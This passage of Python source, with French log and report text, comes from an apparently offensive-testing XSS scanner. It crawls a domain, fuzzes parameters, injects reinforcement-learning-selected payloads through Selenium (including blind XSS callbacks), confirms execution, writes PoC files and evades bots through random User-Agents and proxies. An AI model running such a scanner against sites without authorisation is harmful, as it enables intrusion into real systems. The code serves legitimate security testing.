        csp_strength_mapping = {'None': 0, 'Weak': 1, 'Strong': 2}
        features.append(csp_strength_mapping.get(csp_strength, 0))
        features.append(dom_nodes_added)
        features.append(attr_modifications)
        features.append(browser_console_errors_count) # NEW
        features.append(1 if payload_in_console_logs else 0) # NEW
        
        return features # Total features: 23

    def detect_server(self, url, rate_limiter):
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            # Apply rate limit before request
            asyncio.run(rate_limiter.wait_for_next_request()) 
            response = requests.head(url, headers=headers, timeout=5)
            server_header = response.headers.get('Server', '').lower()
            if 'nginx' in server_header: return 'nginx'
            elif 'apache' in server_header: return 'apache'
            elif 'iis' in server_header: return 'iis'
            else: return 'generic'
        except requests.RequestException as e:
            logging.warning(f"{YELLOW}[WARN]{END} Failed to detect server for {url}: {str(e)}")
            return 'generic'
    
    # NEW: Function to check for CAPTCHA/Anti-bot indicators (heuristics)
    async def check_for_anti_bot(self, driver):
        if not SELENIUM_AVAILABLE:
            return False, "Selenium not available"

        try:
            # Check for common CAPTCHA/challenge elements by ID/Class/Text
            captcha_indicators = [
                (By.ID, 'cf-turnstile-container'), # Cloudflare Turnstile
                (By.ID, 'h-captcha'),             # hCaptcha
                (By.ID, 'recaptcha-challenge'),   # Google reCAPTCHA
                (By.CLASS_NAME, 'captcha-box'),
                (By.CLASS_NAME, 'g-recaptcha'),
                (By.XPATH, "//*[contains(text(), 'Please verify you are human')]"),
                (By.XPATH, "//*[contains(text(), 'Verifying your browser')]")
            ]
            
            for by_type, selector in captcha_indicators:
                try:
                    await asyncio.to_thread(WebDriverWait(driver, 2).until, EC.presence_of_element_located((by_type, selector)))
                    logging.warning(f"{YELLOW}[Anti-Bot] Detected potential CAPTCHA/Anti-bot mechanism: {selector}{Style.RESET_ALL}")
                    # Attempt to bypass by refreshing or using a simple click, this is a very basic attempt
                    # A real bypass would involve more sophisticated logic or third-party services which are out of scope for ethical reasons.
                    # For ethical demonstration, we'll log it and try a refresh.
                    return True, f"Detected CAPTCHA/Anti-bot ({selector})"
                except TimeoutException:
                    continue # Not found, try next indicator
            
            # Check for Cloudflare specific redirection
            if "cloudflare.com/cdn-cgi/l/chk_jschl" in await asyncio.to_thread(lambda: driver.current_url):
                logging.warning(f"{YELLOW}[Anti-Bot] Detected Cloudflare JavaScript challenge redirection.{Style.RESET_ALL}")
                # For educational purposes, we'd note this requires browser-level JavaScript execution which Selenium handles,
                # but might need to wait longer for the challenge to resolve.
                return True, "Cloudflare JavaScript challenge"

            # Check for HTTP response status codes often used by anti-bots (e.g., 403, 429)
            # This would typically be checked at the HTTP request level, not Selenium DOM.
            # But a page that immediately shows a 403 error page can be detected in source.
            if "403 Forbidden" in await asyncio.to_thread(lambda: driver.page_source) or \
               "429 Too Many Requests" in await asyncio.to_thread(lambda: driver.page_source):
                logging.warning(f"{YELLOW}[Anti-Bot] Detected 4xx status in page source (potentially anti-bot).{Style.RESET_ALL}")
                return True, "4xx status in page source"

        except Exception as e:
            logging.warning(f"{YELLOW}[Anti-Bot] Error during anti-bot check: {e}{Style.RESET_ALL}")
        return False, "No anti-bot detected"


    def get_html_injection_context(self, html_source, param_value):
        if not param_value: return 'generic'
        soup = BeautifulSoup(html_source, 'html.parser')
        
        for script_tag in soup.find_all('script'):
            if script_tag.string and param_value in script_tag.string: return 'script_content'
            if script_tag.attrs:
                for attr_val in script_tag.attrs.values():
                    if isinstance(attr_val, str) and param_value in attr_val: return 'script_attribute'
        
        for tag in soup.find_all(True):
            for attr, value in tag.attrs.items():
                if isinstance(value, str) and param_value in value:
                    if attr.startswith('on') or attr in ['href', 'src', 'data', 'action']: return 'attribute'
                    else: return 'attribute'
        
        for comment in soup.find_all(string=lambda text: isinstance(text, Comment) and param_value in text): return 'comment'
        if re.search(r'(href|src|action)=["\'][^"\']*' + re.escape(param_value), html_source, re.IGNORECASE): return 'url'
        if param_value in html_source: return 'html'
        return 'generic'

    def determine_xss_type(self, payload, response_text, injection_context, dom_element_created, browser_console_errors_count, payload_in_console_logs):
        if dom_element_created: return "DOM XSS (Exécution Confirmée)"
        if self.enable_blind_xss and self.interact_host and self.interact_host in payload: return "Blind XSS (Callback)"
        if browser_console_errors_count > 0 and payload_in_console_logs: return "DOM XSS (Erreur Console & Payload)" # NEW DETECTION
        if injection_context == "script_content": return "DOM XSS (Contexte Script)"
        if injection_context == "script_attribute": return "DOM XSS (Attribut Script)"
        if injection_context == "attribute": return "Reflected XSS (Attribut)"
        if injection_context == "html": return "Reflected XSS (HTML)"
        if injection_context == "url": return "Reflected XSS (Contexte URL)"
        if injection_context == "comment": return "Reflected XSS (Commentaire HTML)"
        if payload in response_text: return "Reflected XSS (Générique)"
        return "Not XSS"

    async def check_stored_xss(self, url, payload, session):
        await self.rate_limiter.wait_for_next_request() # Apply rate limit
        try:
            async with session.get(url, timeout=10, ssl=False, headers=get_random_headers()) as response:
                return response.status == 200 and payload in await response.text()
        except Exception as e:
            logging.warning(f"{YELLOW}[WARN]{END} Stored XSS check failed for {url}: {e}{Style.RESET_ALL}")
        return False

    def check_rfc_vulnerabilities(self, response_text, headers, payload):
        content_type = headers.get('Content-Type', '')
        return "application/json" in content_type.lower() and payload in response_text

    async def generate_report(self):
        """Generates a comprehensive HTML report of the scan findings."""
        if not self.report_file:
            logging.warning(f"{Fore.YELLOW}[REPORT] Nom de fichier de rapport non spécifié. Le rapport ne sera pas généré.{Style.RESET_ALL}")
            return

        logging.info(f"{Fore.GREEN}[REPORT] Génération du rapport HTML: {self.report_file}{Style.RESET_ALL}")

        current_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        vulnerabilities_html = ""
        
        if self.vulnerable_urls:
            for url, payload, method, xss_type, poc_file in self.vulnerable_urls:
                poc_link = f"<a href='file://{os.path.abspath(poc_file)}' target='_blank'>{poc_file}</a>" if poc_file else "N/A"
                vulnerabilities_html += f"""
                <div class="vulnerability-item">
                    <h3>{xss_type}</h3>
                    <p><strong>URL Vulnérable:</strong> <a href="{url}" target="_blank">{url}</a></p>
                    <p><strong>Méthode HTTP:</strong> {method}</p>
                    <p><strong>Payload Injecté:</strong> <pre><code>{payload.replace('<', '&lt;').replace('>', '&gt;')}</code></pre></p>
                    <p><strong>Fichier PoC:</strong> {poc_link}</p>
                </div>
                """
        else:
            vulnerabilities_html = "<p>Aucune vulnérabilité XSS n'a été trouvée durant ce scan.</p>"

        report_content = f"""
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Rapport de Scan XSS - {self.target_domain}</title>
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; background-color: #f4f7f6; }}
                .container {{ width: 90%; max-width: 1200px; margin: 30px auto; background-color: #ffffff; padding: 40px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.08); }}
                h1 {{ color: #a30000; text-align: center; margin-bottom: 30px; border-bottom: 2px solid #e0e0e0; padding-bottom: 15px; }}
                h2 {{ color: #0056b3; margin-top: 25px; border-bottom: 1px solid #eeeeee; padding-bottom: 8px; }}
                h3 {{ color: #d63384; margin-top: 15px; }}
                .summary-box {{ background-color: #e9f7ef; border-left: 5px solid #28a745; padding: 18px; margin-bottom: 25px; border-radius: 8px; }}
                .summary-box p {{ margin: 5px 0; }}
                .vulnerability-item {{ background-color: #fff0f5; border: 1px solid #d63384; border-radius: 8px; padding: 20px; margin-bottom: 20px; }}
                pre {{ background-color: #e9ecef; padding: 15px; border-radius: 6px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; font-family: 'Consolas', 'Monaco', monospace; font-size: 0.9em; }}
                code {{ color: #c42f2f; }}
                a {{ color: #007bff; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
                .footer {{ text-align: center; margin-top: 40px; font-size: 0.8em; color: #777; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Rapport de Scan XSS Avancé</h1>
                <p>Date du Rapport: {current_time_str}</p>
                <p>Domaine Cible: <strong>{self.target_domain}</strong></p>

                <div class="summary-box">
                    <h2>Résumé du Scan</h2>
                    <p>Nombre total d'URLs scannées: {len(self.visited_urls)}</p>
                    <p>Nombre de vulnérabilités XSS trouvées: <strong>{len(self.vulnerable_urls)}</strong></p>
                </div>

                <h2>Vulnérabilités Détectées</h2>
                {vulnerabilities_html}

                <div class="footer">
                    <p>Ce rapport a été généré par le scanner XSS avancé.</p>
                    <p>&copy; {datetime.now().year} Votre Équipe de Sécurité</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        try:
            # Use asyncio.to_thread to write to file as it's a blocking I/O operation
            await asyncio.to_thread(lambda: open(self.report_file, 'w', encoding='utf-8').write(report_content))
            logging.info(f"{Fore.GREEN}[REPORT] Rapport HTML sauvegardé avec succès: {self.report_file}{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"{Fore.RED}[REPORT ERROR] Erreur lors de la sauvegarde du rapport: {e}{Style.RESET_ALL}")

    async def scan_target(self, target, session):
        driver = None
        dom_element_created = False # Flag for DOM XSS execution
        csp_present = False
        csp_strength = "None"
        nlp_dom_nodes_added = 0
        nlp_attr_modifications = 0
        nlp_forms_found = False
        nlp_inputs_count = 0
        nlp_scripts_found = False
        nlp_has_eval_or_write = False
        nlp_has_sanitization_patterns = False
        nlp_reflected_location_type = 'none'
        browser_console_errors_count = 0 # NEW: Initialize console error count
        payload_in_console_logs = False # NEW: Initialize payload in console logs flag


        try:
            driver = await self.driver_pool.get()
            url, method, original_params = target['url'], target['method'], target['params']
            
            param_name_to_fuzz = list(original_params.keys())[0] if original_params else None
            
            # WAF and Server detection
            await self.rate_limiter.wait_for_next_request() # Apply rate limit
            response_pre_injection = await asyncio.to_thread(requests.get, url, timeout=5, headers=get_random_headers())
            waf_detected = detect_waf(response_pre_injection.headers, response_pre_injection.text)
            server_type = self.detect_server(url, self.rate_limiter)
            csp_present, csp_strength = analyze_csp(response_pre_injection.headers)


            fuzz_results = {}
            if param_name_to_fuzz:
                fuzz_results = await perform_character_fuzzing(url, param_name_to_fuzz, session, self.rate_limiter)
                self.payload_generator.update_filters(fuzz_results)
            else:
                logging.warning(f"{YELLOW}[WARN]{END} No parameter to fuzz for {url}. Skipping char fuzzing.{Style.RESET_ALL}")

            prelim_context = 'url' if urlparse(url).query else 'html'
            all_generated_payloads = self.payload_generator.get_payloads(server_type=server_type, context=prelim_context, detected_waf=waf_detected, csp_strength=csp_strength)
            
            if self.ai_api_key:
                # Placeholder for actual AI payload generation.
                # In a real scenario, this would involve an API call with proper handling for rate limits,
                # exponential backoff, and parsing of structured AI responses.
                # For now, we'll just log that AI payloads would be generated.
                logging.info(f"{Fore.CYAN}[AI Payloads] AI API Key provided. AI would generate additional payloads here.{Style.RESET_ALL}")
                # ai_payloads = await generate_payloads_with_ai(session, self.ai_api_key, f"Parameter '{param_name_to_fuzz}' in a {method} request to {url}", self.interact_host)
                # all_generated_payloads.extend(ai_payloads)


            for param_to_test in original_params.keys():
                initial_page_source = ""
                try:
                    await self.rate_limiter.wait_for_next_request() # Apply rate limit
                    async with session.get(url, timeout=5, ssl=False, headers=get_random_headers()) as initial_response:
                        if initial_response.status == 200: initial_page_source = await initial_response.text()
                except Exception as e:
                    logging.warning(f"{YELLOW}[WARN]{END} Failed to get initial source for NLP analysis of {url}: {e}{Style.RESET_ALL}")
                
                # NLP analysis needs driver for rich DOM feedback
                # Note: This initial NLP analysis is mostly for page structure before injection,
                # specific reflection/dom_nodes_added will come from post-injection analysis.
                nlp_results_initial = await asyncio.to_thread(analyze_content, initial_page_source, None, driver)
                # Use these initial NLP results as part of the RL state *before* selecting payload
                # However, for training data, we store post-injection NLP results

                # Prepare state for RL agent including CSP info and DOM indicators for pre-injection state
                # UPDATED: Pass initial NLP results to RL Agent's get_state_key for state definition
                current_state_for_rl = self.rl_agent.get_state_key(
                    url, param_to_test, method, prelim_context, server_type, 
                    {char: info['status'] for char, info in fuzz_results.items()}, 
                    waf_detected, csp_present, csp_strength, 
                    nlp_results_initial.get('dom_nodes_added', 0), nlp_results_initial.get('attr_modifications', 0),
                    nlp_results_initial.get('forms_found', False), nlp_results_initial.get('input_fields_count', 0),
                    nlp_results_initial.get('scripts_found', False), nlp_results_initial.get('has_eval_or_write', False),
                    nlp_results_initial.get('has_common_sanitization_patterns', False), nlp_results_initial.get('reflected_location_type', 'none'),
                    0, False # Default console error features for state selection
                )
                payload_to_use = self.rl_agent.select_action(current_state_for_rl, all_generated_payloads)

                if not payload_to_use or payload_to_use == "empty_payload":
                    logging.warning(f"{YELLOW}[WARN]{END} No payload selected by RL agent for {url}/{param_to_test}. Skipping.{Style.RESET_ALL}")
                    continue

                test_params = original_params.copy()
                test_params[param_to_test] = payload_to_use
                
                is_vulnerable = False
                page_source, response_headers, status_code = "", {}, -1
                
                try:
                    start_time = time.time()
                    
                    if method == 'POST':
                        script = f"const form=document.createElement('form');form.method='POST';form.action='{url}';const data={json.dumps(test_params)};for(const k in data){{const i=document.createElement('input');i.type='hidden';i.name=k;i.value=data[k];form.appendChild(i)}}document.body.appendChild(form);form.submit();"
                        await self.rate_limiter.wait_for_next_request() # Apply rate limit for Selenium get
                        await asyncio.to_thread(driver.get, "about:blank")
                        await self.rate_limiter.wait_for_next_request() # Apply rate limit for Selenium execute_script
                        await asyncio.to_thread(driver.execute_script, script)
                    else: # GET
                        full_url = url + '?' + "&".join([f"{k}={quote(str(v))}" for k, v in test_params.items()])
                        await self.rate_limiter.wait_for_next_request() # Apply rate limit for Selenium get
                        await asyncio.to_thread(driver.get, full_url)
                    
                    # New: Check for anti-bot mechanisms after page load
                    anti_bot_detected, anti_bot_reason = await self.check_for_anti_bot(driver)
                    if anti_bot_detected:
                        logging.warning(f"{YELLOW}[Anti-Bot] Anti-bot mechanism detected on {url}: {anti_bot_reason}{Style.RESET_ALL}")
                        # You might want to implement retry logic or mark URL for later.
                        # For now, it's just logged.

                    # New: Automated JavaScript Alert Handling
                    try:
                        # Wait a bit longer for alerts to appear after page load/JS execution
                        WebDriverWait(driver, 1).until(EC.alert_is_present())
                        alert = driver.switch_to.alert
                        logging.info(f"{Fore.GREEN}[SELENIUM ALERT] JavaScript alert detected! Text: '{alert.text}'. Likely XSS execution.{Style.RESET_ALL}")
                        alert.dismiss() # Dismiss the alert to continue
                        is_vulnerable = True # An alert is a strong indicator of XSS execution
                    except TimeoutException:
                        pass # No alert present within the timeout

                    # New: Simulate user interaction to trigger passive events
                    try:
                        actions = ActionChains(driver)
                        # Attempt to click on the body to trigger potential click-based XSS
                        body_element = await asyncio.to_thread(driver.find_element, By.TAG_NAME, 'body')
                        await asyncio.to_thread(actions.move_to_element, body_element)
                        await asyncio.to_thread(actions.click)
                        # Attempt to hover over a few random elements
                        elements = await asyncio.to_thread(driver.find_elements, By.CSS_SELECTOR, 'a, img, div, input, button')
                        if elements:
                            target_element = random.choice(elements)
                            await asyncio.to_thread(actions.move_to_element, target_element)
                            await asyncio.to_thread(actions.perform)
                            # Add a small wait after interaction for DOM updates
                            await asyncio.sleep(0.5) 
                        else:
                            await asyncio.to_thread(actions.perform) # Just perform if no specific elements
                    except UnexpectedAlertPresentException:
                        logging.info(f"{Fore.GREEN}[SELENIUM]{END} Alert detected during interaction! Likely XSS execution.{Style.RESET_ALL}")
                        is_vulnerable = True # Alert means XSS was likely executed
                        # New: Automatically dismiss alerts
                        try:
                            alert = await asyncio.to_thread(driver.switch_to.alert)
                            logging.info(f"{Fore.GREEN}[SELENIUM] Alert text: {alert.text}{Style.RESET_ALL}")
                            await asyncio.to_thread(alert.dismiss)
                            logging.info(f"{Fore.GREEN}[SELENIUM] Alert dismissed.{Style.RESET_ALL}")
                        except Exception as alert_e:
                            logging.warning(f"{YELLOW}[SELENIUM] Could not dismiss alert: {alert_e}{Style.RESET_ALL}")
                    except Exception as e:
                        logging.warning(f"{YELLOW}[SELENIUM]{END} Failed to simulate user interaction or dismiss alert: {e}{Style.RESET_ALL}")
                    
                    await asyncio.sleep(3) # Increased wait time for page to render and events to fire, important for detection
                    response_time = time.time() - start_time
                    page_source = await asyncio.to_thread(lambda: driver.page_source)
                    
                    # Capture browser console logs
                    browser_logs = await asyncio.to_thread(driver.get_log, 'browser')
                    browser_console_errors_count = 0
                    payload_in_console_logs = False
                    for log_entry in browser_logs:
                        if log_entry['level'] == 'SEVERE': # SEVERE usually indicates an error
                            browser_console_errors_count += 1
                            if payload_to_use in log_entry['message']:
                                payload_in_console_logs = True
                                logging.info(f"{Fore.GREEN}[CONSOLE LOG] Payload '{payload_to_use}' found in browser console error: {log_entry['message']}{Style.RESET_ALL}")
                        elif payload_to_use in log_entry['message']: # Also check non-error logs for payload reflection
                            payload_in_console_logs = True
                            logging.info(f"{Fore.GREEN}[CONSOLE LOG] Payload '{payload_to_use}' found in browser console log: {log_entry['message']}{Style.RESET_ALL}")

                    
                    # Use aiohttp session for headers and status code after Selenium interaction for rate limit compliance
                    await self.rate_limiter.wait_for_next_request() # Apply rate limit
                    try:
                        async with session.request(method, url, params=test_params if method=='GET' else None, data=test_params if method=='POST' else None, timeout=5, ssl=False) as r:
                            status_code, response_headers = r.status, r.headers
                    except Exception as e:
                        logging.warning(f"{YELLOW}[WARN]{END} Failed to get headers/status for {url} after Selenium action: {e}{Style.RESET_ALL}")

                    # Use BeautifulSoup for more precise reflection checks
                    soup = BeautifulSoup(page_source, 'html.parser')
                    payload_reflected = False
                    # Check in multiple contexts
                    if soup.find(string=lambda text: payload_to_use in text): payload_reflected = True
                    if soup.find(lambda tag: any(payload_to_use in (value or '') for value in tag.attrs.values())): payload_reflected = True
                    if soup.find('script', string=lambda text: payload_to_use in text): payload_reflected = True


                    dom_element_created = check_dom_for_xss_execution(driver, payload_to_use) # Check for DOM XSS execution marker
                    
                    # NLP analysis post-injection for accurate dynamic DOM changes
                    nlp_results_post_injection = await asyncio.to_thread(analyze_content, page_source, payload_to_use, driver)
                    # Update NLP detailed features from post-injection results
                    nlp_dom_nodes_added = nlp_results_post_injection.get('dom_nodes_added', 0)
                    nlp_attr_modifications = nlp_results_post_injection.get('attr_modifications', 0)
                    nlp_forms_found = nlp_results_post_injection.get('forms_found', False)
                    nlp_inputs_count = nlp_results_post_injection.get('input_fields_count', 0)
                    nlp_scripts_found = nlp_results_post_injection.get('scripts_found', False)
                    nlp_has_eval_or_write = nlp_results_post_injection.get('has_eval_or_write', False)
                    nlp_has_sanitization_patterns = nlp_results_post_injection.get('has_common_sanitization_patterns', False)
                    nlp_reflected_location_type = nlp_results_post_injection.get('reflected_location_type', 'none')

                    injection_context = self.get_html_injection_context(page_source, payload_to_use)
                    logging.info(f"{BLUE}[CONTEXT]{END} Payload reflected in context: {injection_context} for {url}. NLP Reflected Type: {nlp_reflected_location_type}. DOM Nodes Added: {nlp_dom_nodes_added}, Attr Mods: {nlp_attr_modifications}{Style.RESET_ALL}")

                    # Determine if vulnerable (more comprehensive check with detailed DOM indicators & console logs)
                    if is_vulnerable or payload_reflected or dom_element_created or (self.enable_blind_xss and self.interact_host in payload_to_use) or (browser_console_errors_count > 0 and payload_in_console_logs):
                        is_vulnerable = True
                    
                    if not is_vulnerable and method == 'POST' and await self.check_stored_xss(url, payload_to_use, session):
                        xss_type = "Stored XSS"
                        is_vulnerable = True
                    
                    if not is_vulnerable and self.check_rfc_vulnerabilities(page_source, response_headers, payload_to_use):
                        xss_type = "RFC Mismatch Vulnerability"
                        is_vulnerable = True
                    
                    # Final determination of XSS type
                    xss_type = self.determine_xss_type(payload_to_use, page_source, injection_context, dom_element_created, browser_console_errors_count, payload_in_console_logs)

                    result_data = { # Collect all data needed for scan_results
                        'url': url,
                        'param': param_to_test,
                        'payload': payload_to_use,
                        'server_type': server_type,
                        'method': method,
                        'response_code': status_code,
                        'response_time': response_time,
                        'response_text': page_source,
                        'response_pattern': page_source[:100], # Snippet
                        'success': 1 if is_vulnerable else 0,
                        'content_snippet': page_source[:100], # Snippet
                        'vulnerable': 1 if is_vulnerable else 0,
                        'injection_context': injection_context,
                        'nlp_results': nlp_results_post_injection, # Store the full NLP results dictionary
                        'fuzz_results': fuzz_results, # Store full fuzz results
                        'payload_len': len(payload_to_use),
                        'reflected_len_ratio': reflected_len_ratio,
                        'payload_nesting_level': nlp_results_post_injection.get('payload_reflection_level', -1),
                        'waf_detected': waf_detected,
                        'num_encoded_chars': num_encoded_chars,
                        'dom_element_created': 1 if dom_element_created else 0,
                        'csp_present': csp_present,
                        'csp_strength': csp_strength,
                        'dom_nodes_added': nlp_dom_nodes_added,
                        'attr_modifications': nlp_attr_modifications,
                        'browser_console_errors_count': browser_console_errors_count, # NEW
                        'payload_in_console_logs': payload_in_console_logs # NEW
                    }
                    self.scan_results.append(result_data) # Add to scan results for model training

                    if is_vulnerable:
                        vulnerable = 1
                        logging.info(f"{Fore.RED}[VULNERABILITY CONFIRMED]{END} {xss_type} detected at {url} with payload {payload_to_use} (Method: {method}){Style.RESET_ALL}")
                        poc_file = await asyncio.to_thread(generate_xss_poc, url, payload_to_use, method, xss_type)
                        self.vulnerable_urls.append((url, payload_to_use, method, xss_type, poc_file))
                        insert_vulnerability_data(url, payload_to_use, method, xss_type, 1, poc_file)
                        await asyncio.to_thread(lambda: open('audit_links.txt', 'a').write(f"{url},{payload_to_use},{method},{xss_type},{poc_file}\n"))
                    else:
                        logging.info(f"{BLUE}[INFO]{END} Payload '{payload_to_use}' not found or not exploitable in {url}.{Style.RESET_ALL}")

                    fuzz_summary_for_rl = {char: info['status'] for char, info in fuzz_results.items()}
                    # Prepare DOM indicators for RL agent, using the actual post-injection state
                    reward = self.get_reward_for_payload(is_vulnerable, injection_context, payload_reflected, dom_element_created, browser_console_errors_count, payload_in_console_logs)
                    
                    # UPDATED: Pass correct and comprehensive NLP results for RL Agent's learning
                    self.rl_agent.learn(
                        url, param_to_test, payload_to_use, method, reward, injection_context, 
                        server_type, fuzz_summary_for_rl, waf_detected, csp_present, csp_strength, 
                        nlp_dom_nodes_added, nlp_attr_modifications, nlp_forms_found, nlp_inputs_count, 
                        nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, 
                        nlp_reflected_location_type, browser_console_errors_count, payload_in_console_logs
                    )

                    fuzz_num_filtered = sum(1 for info in fuzz_results.values() if info['status'] == 'filtered')
                    fuzz_num_encoded = sum(1 for info in fuzz_results.values() if info['status'] == 'encoded')
                    
                    payload_len = len(payload_to_use)
                    # Use a more accurate check for reflected length, if it's directly in the source
                    reflected_match = re.search(re.escape(payload_to_use), page_source)
                    reflected_len = len(reflected_match.group(0)) if reflected_match else 0
                    reflected_len_ratio = reflected_len / payload_len if payload_len > 0 else 0
                    
                    num_encoded_chars = sum(1 for char_code in map(ord, payload_to_use) if not (32 <= char_code <= 126)) # Count non-ASCII printable chars

                    # Insert training data with all new features (33 parameters)
                    insert_training_data(url, param_to_test, payload_to_use, server_type, method, status_code, response_time, page_source[:100], vulnerable, page_source[:100], vulnerable, injection_context, 1 if nlp_forms_found else 0, nlp_inputs_count, 1 if nlp_scripts_found else 0, 1 if nlp_has_eval_or_write else 0, 1 if nlp_has_sanitization_patterns else 0, nlp_reflected_location_type, fuzz_num_filtered, fuzz_num_encoded, payload_len, reflected_len_ratio, nlp_results_post_injection.get('payload_reflection_level', -1), waf_detected, num_encoded_chars, 1 if dom_element_created else 0, 1 if csp_present else 0, csp_strength, nlp_dom_nodes_added, nlp_attr_modifications, browser_console_errors_count, payload_in_console_logs)

                except (WebDriverException, TimeoutException) as e:
                    logging.warning(f"{YELLOW}[WARN]{END} WebDriver/Timeout error for {url} with payload {payload_to_use}: {e}{Style.RESET_ALL}")
                except Exception as e:
                    logging.error(f"{Fore.RED}[ERROR]{END} Unexpected error scanning {url} with payload {payload_to_use}: {e}{Style.RESET_ALL}", exc_info=True)
        finally:
            if driver: await self.driver_pool.put(driver)

    async def run(self, crawl_option='none', duration=None):
        start_time = asyncio.get_event_loop().time()
        logging.info(f"\n{'='*20} DÉMARRAGE DU SCAN AVANCÉ {'='*20}")
        logging.info(f"Cible: {self.target_domain}")
        logging.info(f"Limitation de taux: {self.rate_limiter.requests_per_minute} requêtes/minute.")

        if self.enable_blind_xss and self.blind_xss_callback_url:
            logging.critical(f"{Fore.YELLOW}Les payloads Blind XSS utiliseront l'URL de rappel : {self.blind_xss_callback_url}{Style.RESET_ALL}")
            logging.critical(f"{Fore.GREEN}Surveillez votre tableau de bord ({self.blind_xss_callback_url}) pour les interactions.{Style.RESET_ALL}")
        else:
            logging.critical(f"{Fore.YELLOW}Les payloads Blind XSS sont désactivés ou n'ont pas d'URL de rappel configurée.{Style.RESET_ALL}")


        await self.initialize_drivers()
        if self.driver_pool.qsize() == 0:
            logging.critical("Aucun pilote n'a pu être initialisé. Arrêt du scan.")
            return

        # Pass proxy_auth to ClientSession connector if proxy is authenticated
        connector = aiohttp.TCPConnector(ssl=False)
        if self.proxy and "@" in self.proxy and ":" in self.proxy.split('@')[0]:
            # This is a simplified approach. Aiohttp client session also supports proxy_auth
            # but handling it dynamically requires more sophisticated parsing of the proxy URL
            # and may need a custom connector or header setup.
            # For this example, we'll just log a warning that authenticated AIOHTTP proxies need more config.
            logging.warning(f"{YELLOW}[AIOHTTP Proxy] Authenticated proxy setup for aiohttp is complex and not fully automated here. Using simple proxy if provided.{Style.RESET_ALL}")
            async with aiohttp.ClientSession(headers=get_random_headers(), connector=connector, proxy=self.proxy.split("@")[-1] if self.proxy else None) as session:
                await self._run_scan_logic(session, crawl_option, duration)
        else:
            async with aiohttp.ClientSession(headers=get_random_headers(), connector=connector, proxy=self.proxy) as session:
                await self._run_scan_logic(session, crawl_option, duration)


    async def _run_scan_logic(self, session, crawl_option, duration):
        initial_urls_for_scan = []
        
        # Handle interactive crawl options
        if crawl_option == 'deepcrawl':
            initial_urls_for_scan.extend(await fetch_urls_commoncrawl(self.target_domain, session, self.rate_limiter))
            initial_urls_for_scan.extend(await fetch_urls_wayback(self.target_domain, session, self.rate_limiter))
        elif crawl_option == 'crawl':
            initial_urls_for_scan.extend(await crawl_website(self.target_domain, session, self.max_depth, self.rate_limiter))
        else: # If no specific crawl option or just a URL/domain provided
            initial_urls_for_scan = self.url_list # Use the initial target URLs passed to the scanner

        self.url_list = list(set(initial_urls_for_scan))
        if not self.url_list:
            logging.warning("Aucune URL cible à scanner. Fin du scan.")
            return

        logging.info(f"{GREEN}[INFO]{END} Total d'URLs uniques trouvées pour le traitement : {len(self.url_list)}{Style.RESET_ALL}")
        await asyncio.to_thread(lambda: open('found_links.txt', 'w').write("\n".join(self.url_list)))

        # Phase 1: Scan all discovered targets to collect initial training data
        all_discovered_targets = []
        for entry_url in self.url_list:
            all_discovered_targets.extend(await self.crawl_and_discover_forms_and_params(session, entry_url, self.max_depth, self.rate_limiter))
        
        seen_targets, scan_targets = set(), []
        for target in all_discovered_targets:
            target_key = (target['url'], target['method'], frozenset(target['params'].keys()))
            if target_key not in seen_targets:
                seen_targets.add(target_key)
                scan_targets.append(target)

        if not scan_targets:
            logging.warning("Aucun point d'entrée avec paramètres ou formulaires découvert. Le scan ne peut pas continuer.")
            return
        
        logging.info(f"\n{len(scan_targets)} points d'entrée à scanner avec {self.num_drivers} workers.")
        
        tasks = [self.scan_target(target, session) for target in scan_targets]
        if duration:
            _, pending = await asyncio.wait(tasks, timeout=duration)
            for task in pending: task.cancel()
            logging.info(f"{RED}[INFO]{END} Scan terminé en raison de la limite de temps ({duration}s).{Style.RESET_ALL}")
        else:
            await asyncio.gather(*tasks, return_exceptions=True)

        # After the main scan loop, if the model wasn't trained at the start, try to train it now
        if self.use_model and self.model and not self.model.is_trained and self.scan_results:
            logging.info(f"{GREEN}[INFO]{END} Entraînement du modèle avec les données collectées lors du scan actuel.{Style.RESET_ALL}")
            await self.train_new_model()
        elif self.use_model and self.model and not self.model.is_trained and not self.scan_results:
            logging.warning(f"{YELLOW}[WARN]{END} Impossible d'entraîner le modèle : aucune donnée de scan n'a été collectée.{Style.RESET_ALL}")

        # If model is now trained, we can re-filter the URLs for future scans (if implemented iteratively)
        # For a single run, this might be less critical but important for subsequent runs or a multi-stage scan.
        # if self.use_model and self.model and self.model.is_trained:
        #     logging.info(f"{GREEN}[INFO]{END} Re-filtrage des URLs avec le modèle nouvellement entraîné.{Style.RESET_ALL}")
        #     self.url_list = await self.auto_filter(self.url_list) # Re-filter with new model

        await self.generate_report() # Call the newly integrated report generation

        while not self.driver_pool.empty():
            driver = await self.driver_pool.get()
            await asyncio.to_thread(driver.quit)
        
        # Ensure database connection is closed gracefully
        db_queue.put("terminate")
        db_queue.join()
        if db_connection:
            db_connection.close()
            logging.info(f"{GREEN}[INFO]{END} Connexion à la base de données fermée.{Style.RESET_ALL}")

        end_time = asyncio.get_event_loop().time()
        logging.info(f"\n{'='*20} RAPPORT FINAL DU SCAN {'='*20}")
        logging.info(f"Scan terminé en {end_time - start_time:.2f} secondes.")
        if self.enable_blind_xss and self.blind_xss_callback_url:
            logging.critical(f"{Fore.YELLOW}Le scan a injecté des payloads Blind XSS. Vous DEVEZ vérifier manuellement le tableau de bord de votre serveur de rappel pour confirmer les vulnérabilités:{Style.RESET_ALL}")
            logging.critical(f"{Fore.GREEN}--> {self.blind_xss_callback_url} <--{Style.RESET_ALL}")
        else:
            logging.info(f"{Fore.BLUE}La détection de Blind XSS n'était pas activée ou n'avait pas d'URL de rappel.{Style.RESET_ALL}")

    async def crawl_and_discover_forms_and_params(self, session, start_url, max_depth, rate_limiter):
        urls_to_visit = deque([(start_url, 0)])
        discovered_targets, crawled_links = [], {start_url}
        
        # Add initial URL parameters if any
